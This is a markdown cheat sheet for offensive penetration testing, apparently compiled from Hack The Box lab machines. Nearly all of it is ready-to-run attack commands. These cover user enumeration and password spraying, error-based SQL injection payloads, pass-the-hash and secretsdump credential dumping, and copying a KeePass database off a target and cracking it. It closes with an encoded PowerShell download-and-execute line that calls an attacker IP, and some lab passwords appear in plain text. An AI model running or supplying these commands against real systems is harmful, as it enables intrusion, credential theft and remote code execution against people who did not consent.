# Enumeration for Initial Access 

## Windows 

### Kerbrute 
 
Identify valid users with user list 
```
./kerbrute userenum --dc 10.10.11.236 -d manager.htb /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
```
### NetExec

Identify valid users 
```
netexec smb 10.10.11.236 -k -u 'ryan' -p ''
```

RID bruteforce valid users 
```
netexec smb 10.10.11.236 -u 'guest' -p '' --rid-bruteforce
```

Bruteforce users with the password of their username (ex: admin:admin)
```
netexec smb 10.10.11.236 -u users.txt -p users.txt --no-bruteforce --continue-on-success
```

List users with valid credentials
```
nxc smb 10.10.11.41 -u judith.mader -p judith09 --users
```

Enumerate smb shares with valid credentials
```
netexec smb 10.10.11.236 -u operator -p operator --shares
```

Test login for mssql with valid credentials
```
netexec mssql 10.10.11.236 -u operator -p operator
```

Test login for winrm with valid credentials
```
netexec winrm 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'
```

### Certipy

Search for vulnerable active directory certificates / services 
```
certipy find -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -stdout -vulnerable
```
# Windows Initial Access

## Impacket

### mssqlclient.py
```
mssqlclient.py manager/operator:operator@manager.htb -windows-auth
```
- `enable_xp_cmdshell` - elevate to system
- `xp_dirtree` - read files

### psexec.py
Login with NT Hash
```
psexec.py -hashes <NT HASH>:<NT HASH> administrator@10.10.11.236
```

### secretsdump.py

Dump hashes and secrets, password history, and when password was last set
```
secretsdump.py -user-status -history -pwd-last-set administrator.htb/ethan@10.10.11.42
```
- paste in password

## Evil-WinRM

Login with password
```
evil-winrm -i 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'
```

Login with NT Hash 
```
evil-winrm -i 10.10.11.236 -H <NT HASH> -u administrator
```
## Web App
### Directory Busting 

```
gobuster -u http://10.10.10.121 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o http-root-gobuster.log
```

```
gobuster dir -u http://soccer.htb/ -w /usr/share/Seclists/Discovery/Web-Content/raft-small-words.txt
```

```
gobuster dir -u htpp://10.10.10.146 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
```

```
feroxbuster -u http://siteisup.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

### Virtual Host Enumeration 

```
gobuster vhost -k -u https://monitored.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

```
ffuf -u http://linkvortex.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.linkvortex.htb'
```
- Execute this and then add `-fs <SIZE #>`
### Error-Based SQLi

[MySQL INFORMATION_SCHEMA Table Reference](https://dev.mysql.com/doc/refman/8.4/en/information-schema-table-reference.html) ➡ [SCHEMATA Table](https://dev.mysql.com/doc/refman/8.4/en/information-schema-schemata-table.html)

```
1 AND EXTRACTVALUE(1,concat(0x0a, (select SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1)))
```
- Expected to return 'information_schema'

Get database names
```
1 AND EXTRACTVALUE(1,concat(0x0a, (select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.SCHEMATA)))
```

Get columns of a specific database
```
1 AND EXTRACTVALUE(1,concat(0x0a, (select group_concat(TABLE_NAME, ":", COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA = '<db_name>')))
```

Get table name (one row at a time) by toggling LIMIT n,1 
```
1 AND EXTRACTVALUE(1,concat(0x0a, (select TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA = '<db_name>' LIMIT 1,1)))
```

### Fuzzing

Fuzzing port numbers & filtering out 61 byte response
```
ffuf -request ssrf.req -request-proto http -w <(seq 1 65535) -fs 61
```

Fuzzing URL parameters with api wordlist
```
wfuzz -u 'http://10.10.10.185/index.php?FUZZ=index' -w /usr/share/seclists/Discovery/Web-Content/api/actions.txt
```
Then use `--hl` `<output length #>`

## SMB Enumeration

### NetExec

List SMB shares with valid creds
```
nxc smb 10.10.11.14 -u maya -p m4y4ngs4ri --shares
```

### SMBClient 

Use SMBClient to read shares 
```
smbclient -U maya //10.10.11.14/Important\ Documents
```



## SNMP Enumeration 

```
snmpwalk -v2c -c public 10.10.11.248
```

```
snmpwalk -v2c -c public 10.10.11.248 -m all
```

Faster method with snmpbulkwalk

```
snmpbulkwalk -v2c -c public 10.10.11.248 -m all | tee snmp.out
```

```
snmpbulkwalk -Cr1000 -c public -v2c 10.10.11.136 . > snmpwalk.1
```

## RPCCLIENT Enumeration

```
rpcclient -U '' 10.10.10.248
```

Add -N to say no password 
```
rpcclient -U '' -N 10.10.10.248
```

### Authenticated RPCCLIENT Enumeration

```
enumdomusers
```


## Active Directory Enumeration

### Kerbrute 

Enumerate users in a domain
```
./kerbrute userenum --dc 10.10.10.248 -d intelligence.htb <username-list>
```

Password spraying users in a domain
```
./kerbrute passwordspray --dc 10.10.10.248 -d intelligence.htb <username-list> 'Passw0rd!'
```

### Bloodhound

```
python3.8 bloodhound.py -ns 10.10.10.248 -d intelligence.htb -dc dc.intelligence.htb -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -c All
```
# Reverse Shells

## PHP

[PHP-Reverse-Shell for Windows and Linux ](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php)

## Windows

[Nishang Shells](https://github.com/samratashok/nishang/tree/master/Shells)
# Interactive Shell 

Get an interactive shell 

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Hit CTRL + Z

```
stty raw -echo
```

```
export TERM=xterm
```

# Linux Privilege Escalation 

## Find SETUID Binaries 

```
find / -perm -4000 2>/dev/null
```

# Windows Privilege Escalation

## Pass the Hash

### pth-toolkit
[pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit/tree/master)

```
pth-winexe -U jenkins/administrator //10.10.10.63 cmd.exe
```

## Abusing Token Privileges 
[Abusing Token Privileges](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/) 

**How to enumerate 
```
whoami /priv 
```
Abusable privileges
```
- SeImpersonatePrivilege
- SeAssignPrimaryPrivilege
- SeTcbPrivilege
- SeBackupPrivilege
- SeRestorePrivilege
- SeCreateTokenPrivilege
- SeLoadDriverPrivilege
- SeTakeOwnershipPrivilege
- SeDebugPrivilege
```

### SeImpersonatePrivilege

[Rotten Potato](https://github.com/foxglovesec/RottenPotato) 

### Automated Scripts
#### JAWS
Execute [JAWS](https://github.com/411Hall/JAWS) script 
# Transferring Files 

## SMB Server 

On Kali box
```
impacket-smbserver NameofShare `pwd`
```

On Target box 
```
New-PSDrive -Name "NameofDrive" -PSProvider "FileSystem" -Root "\\10.10.14.30\NameofShare"
```

Change into drive on target box
```
cd NameofDrive
```

Copy file to transfer into the directory 
```
cp C:\Windows\kohsuke\Documents\CEH.kdbx .
```

# Hash Cracking 

## John 

### Obtain hash from KeePass database 

```
keepass2john CEH.kdbx
```

## Hashcat

[Hash modes](https://hashcat.net/wiki/doku.php?id=example_hashes)

```
hashcat -m 13400 jeeves-keepass.hash /usr/share/wordlist/rockyou.txt
```


# Encoding Payloads

## Windows 

Base64 (UTF-16LE) encode using Kali terminal

```
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3:8001/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w 0
```
